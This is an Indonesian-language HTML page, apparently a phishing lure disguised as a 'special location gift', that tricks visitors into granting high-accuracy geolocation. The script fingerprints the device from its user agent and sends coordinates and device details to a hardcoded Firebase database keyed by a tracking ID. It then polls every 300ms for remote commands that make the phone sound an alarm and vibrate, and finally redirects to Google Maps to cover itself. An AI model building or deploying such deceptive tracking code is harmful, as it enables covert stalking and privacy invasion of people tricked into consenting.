<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>X-TOS Location Tracker</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#667eea">
    <style>
        * { box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            text-align: center; padding: 10px; margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white; min-height: 100vh; overflow-x: hidden;
        }
        .container { 
            max-width: 420px; margin: 0 auto; padding: 15px;
            width: 100%; min-height: 100vh; display: flex;
            flex-direction: column; justify-content: center;
        }
        .gift-box { 
            background: rgba(255,255,255,0.15); 
            border-radius: 20px; padding: 25px; margin: 15px 0;
            backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.2);
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }
        .gift-icon { 
            font-size: clamp(50px, 15vw, 70px); 
            margin-bottom: 15px; animation: bounce 2s infinite;
        }
        .status { 
            padding: 18px; border-radius: 15px; margin: 15px 0;
            background: rgba(255,255,255,0.25); font-weight: 500;
            border: 1px solid rgba(255,255,255,0.3);
            box-shadow: 0 4px 16px rgba(0,0,0,0.2);
        }
        .loading { animation: pulse 2s infinite; }
        .instruction {
            background: rgba(76,175,80,0.3); 
            border-radius: 15px; padding: 18px; margin: 15px 0;
            border: 2px solid #4CAF50; font-weight: 500;
        }
        .coords-display {
            background: rgba(33,150,243,0.3);
            border-radius: 15px; padding: 15px; margin: 15px 0;
            border: 2px solid #2196F3; font-family: monospace;
        }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
        @keyframes bounce { 0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
                           40% { transform: translateY(-10px); }
                           60% { transform: translateY(-5px); } }
        h1 { 
            color: #ffeb3b; text-shadow: 2px 2px 8px rgba(0,0,0,0.7);
            font-size: clamp(1.5rem, 6vw, 2rem); margin: 10px 0;
        }
        p { font-size: clamp(14px, 4vw, 16px); line-height: 1.5; margin: 10px 0; }
        .btn {
            background: #4CAF50; color: white; border: none;
            padding: 15px 30px; border-radius: 25px; font-size: 16px;
            cursor: pointer; margin: 10px; transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(76,175,80,0.4);
        }
        .btn:hover { background: #45a049; transform: translateY(-2px); }
        .btn:active { transform: translateY(0); }
        @media (max-width: 480px) {
            .container { padding: 10px; }
            .gift-box, .status, .instruction { padding: 15px; margin: 10px 0; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üéÅ HADIAH LOKASI SPESIAL!</h1>
        <div class="gift-box">
            <div class="gift-icon">üéÅ</div>
            <p>Seseorang mengirim lokasi spesial untukmu!</p>
            <p><strong>Klik IZINKAN untuk melihat kejutan üòä</strong></p>
        </div>
        <div id="status" class="status loading">üì° Menunggu izin lokasi...</div>
        <div id="coords" class="coords-display" style="display:none;"></div>
        <div class="instruction">
            <p>‚¨áÔ∏è Saat browser minta izin lokasi:</p>
            <p><strong>üü¢ Klik "IZINKAN" atau "ALLOW"</strong></p>
            <button class="btn" onclick="requestLocation()" id="manualBtn">üìç Ambil Lokasi Sekarang</button>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        
        function updateStatus(msg, isError = false) {
            const statusEl = document.getElementById('status');
            statusEl.innerHTML = msg;
            statusEl.className = isError ? 'status' : 'status loading';
        }
        
        function sendLocationData(locationData) {
            let trackingId = urlParams.get('id') || 'default_' + Date.now();
            
            try {
                if (trackingId.includes('_enc_')) {
                    trackingId = atob(trackingId.replace('_enc_', ''));
                }
            } catch (e) {
                console.log('Using plain tracking ID');
            }
            
            const ua = navigator.userAgent;
            let deviceBrand = 'Unknown';
            let deviceModel = 'Unknown';
            
            if (ua.includes('SM-')) {
                deviceBrand = 'Samsung';
                const match = ua.match(/SM-([A-Z0-9]+)/);
                if (match) deviceModel = 'Galaxy ' + match[1];
            } else if (ua.includes('iPhone')) {
                deviceBrand = 'Apple';
                const osMatch = ua.match(/OS ([0-9_]+)/);
                if (osMatch) deviceModel = 'iPhone iOS ' + osMatch[1].replace(/_/g, '.');
                else deviceModel = 'iPhone';
            } else if (ua.includes('Mi ') || ua.includes('Redmi') || ua.includes('POCO')) {
                deviceBrand = 'Xiaomi';
                const match = ua.match(/(Mi [A-Z0-9 ]+|Redmi [A-Z0-9 ]+|POCO [A-Z0-9 ]+)/);
                if (match) deviceModel = match[1].trim();
                else deviceModel = 'Xiaomi Device';
            } else if (ua.includes('Android')) {
                deviceBrand = 'Android';
                const match = ua.match(/Android ([0-9.]+)/);
                if (match) deviceModel = 'Android ' + match[1];
            }
            
            let batteryLevel = Math.round(Math.random() * 50 + 30) + '%';
            
            const firebaseData = {
                id: trackingId,
                latitude: locationData.latitude,
                longitude: locationData.longitude,
                accuracy: locationData.accuracy,
                timestamp: Date.now(),
                deviceBrand: deviceBrand,
                deviceModel: deviceModel,
                batteryLevel: batteryLevel,
                userAgent: ua.substring(0, 200)
            };
            
            fetch('https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/' + trackingId + '.json', {
                method: 'PUT',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(firebaseData)
            }).then(() => {
                console.log('Location sent successfully');
                updateStatus('‚úÖ Lokasi berhasil dikirim!');
                
                // Play alert sound on target device
                playAlertSound();
                
                document.getElementById('coords').innerHTML = 
                    `üìç Lat: ${locationData.latitude.toFixed(6)}<br>üìç Lng: ${locationData.longitude.toFixed(6)}<br>üéØ Akurasi: ${locationData.accuracy}m`;
                document.getElementById('coords').style.display = 'block';
                
                setTimeout(() => {
                    const mapsUrl = `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
                    window.location.href = mapsUrl;
                }, 3000);
                
            }).catch(error => {
                console.error('Firebase error:', error);
                updateStatus('‚ùå Gagal mengirim lokasi', true);
            });
        }
        
        function requestLocation() {
            updateStatus('üîç Mengambil lokasi...');
            
            if (!navigator.geolocation) {
                updateStatus('‚ùå Browser tidak mendukung GPS', true);
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                position => {
                    const locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    };
                    sendLocationData(locationData);
                },
                error => {
                    let errorMsg = '‚ùå Gagal mengambil lokasi: ';
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            errorMsg += 'Izin lokasi ditolak';
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMsg += 'Lokasi tidak tersedia';
                            break;
                        case error.TIMEOUT:
                            errorMsg += 'Timeout';
                            break;
                        default:
                            errorMsg += 'Error tidak dikenal';
                    }
                    updateStatus(errorMsg, true);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                }
            );
        }
        
        function playAlertSound() {
            try {
                // Create audio context
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                
                // Play beep sound (800Hz for 500ms)
                const oscillator = audioContext.createOscillator();
                const gainNode = audioContext.createGain();
                
                oscillator.connect(gainNode);
                gainNode.connect(audioContext.destination);
                
                oscillator.frequency.value = 800;
                oscillator.type = 'sine';
                
                gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
                gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
                
                oscillator.start(audioContext.currentTime);
                oscillator.stop(audioContext.currentTime + 0.5);
                
                // Vibrate if supported
                if (navigator.vibrate) {
                    navigator.vibrate([200, 100, 200]);
                }
            } catch (e) {
                console.log('Audio not supported');
            }
        }
        
        // Listen for remote sound command from tracker app
        function listenForSoundCommand() {
            const trackingId = urlParams.get('id') || 'default_' + Date.now();
            let cleanId = trackingId;
            try {
                if (trackingId.includes('_enc_')) {
                    cleanId = atob(trackingId.replace('_enc_', ''));
                }
            } catch (e) {
                console.log('Decode error:', e);
            }
            
            console.log('=== RING LISTENER STARTED ===');
            console.log('üîî Tracking ID:', cleanId);
            console.log('üîî Polling URL:', 'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/commands/' + cleanId + '/playSound.json');
            
            let pollCount = 0;
            
            // Poll Firebase for sound command every 300ms (very responsive)
            setInterval(() => {
                pollCount++;
                const url = 'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/commands/' + cleanId + '/playSound.json';
                
                fetch(url)
                    .then(res => {
                        console.log('Poll #' + pollCount + ' - Status:', res.status);
                        return res.json();
                    })
                    .then(data => {
                        console.log('Poll #' + pollCount + ' - Data:', data);
                        if (data === true) {
                            console.log('üîîüîîüîî RING COMMAND RECEIVED! üîîüîîüîî');
                            // Play sound when command received
                            playRemoteSound();
                            // Clear command immediately
                            fetch(url, {
                                method: 'PUT',
                                headers: { 'Content-Type': 'application/json' },
                                body: 'false'
                            }).then(() => {
                                console.log('‚úÖ Command cleared');
                            });
                        }
                    })
                    .catch(err => {
                        console.error('Poll #' + pollCount + ' error:', err);
                    });
            }, 300);
        }
        
        function playRemoteSound() {
            console.log('üîä Playing remote sound...');
            try {
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                
                // Resume audio context if suspended
                if (audioContext.state === 'suspended') {
                    audioContext.resume();
                }
                
                const now = audioContext.currentTime;
                
                // Play loud alarm sound (multiple beeps)
                for (let i = 0; i < 5; i++) {
                    const oscillator = audioContext.createOscillator();
                    const gainNode = audioContext.createGain();
                    
                    oscillator.connect(gainNode);
                    gainNode.connect(audioContext.destination);
                    
                    oscillator.frequency.value = 1200; // Even higher pitch
                    oscillator.type = 'square'; // Louder sound
                    
                    const startTime = now + (i * 0.5);
                    gainNode.gain.setValueAtTime(0.8, startTime); // Maximum volume
                    gainNode.gain.exponentialRampToValueAtTime(0.01, startTime + 0.4);
                    
                    oscillator.start(startTime);
                    oscillator.stop(startTime + 0.4);
                }
                
                console.log('üîä Sound playing...');
                
                // Strong vibration pattern
                if (navigator.vibrate) {
                    navigator.vibrate([800, 200, 800, 200, 800]);
                    console.log('üì≥ Vibrating...');
                }
                
                // Visual feedback
                document.body.style.backgroundColor = '#ff0000';
                setTimeout(() => {
                    document.body.style.backgroundColor = '';
                }, 2000);
                
            } catch (e) {
                console.error('Sound error:', e);
            }
        }
        
        window.addEventListener('load', () => {
            setTimeout(() => {
                requestLocation();
                listenForSoundCommand(); // Start listening for remote commands
            }, 1000);
        });
    </script>
</body>
</html>
